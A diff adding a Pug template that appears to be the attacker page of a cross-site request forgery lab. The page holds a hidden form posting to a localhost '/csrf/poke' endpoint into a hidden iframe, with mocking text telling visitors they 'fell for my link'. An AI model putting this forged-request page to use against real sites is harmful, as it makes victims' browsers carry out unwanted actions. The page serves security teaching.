@@ -1,0 +1,14 @@
+extends layout.pug
+
+mixin csrf_form
+  form#anti-forgery-form(method='post' action='http://localhost:3000/csrf/poke' hidden target='sneaky')
+    input#csrf-token(type='hidden' name='csrf-token')
+    button.btn.btn-success(type='submit') no click required
+
+block content
+  p
+    | Hello, dog lover! You fell for my link and visited my page,
+    | so if you have JS enabled you are already screwed! :D
+  div
+    +csrf_form
+  iframe(name='sneaky', hidden)
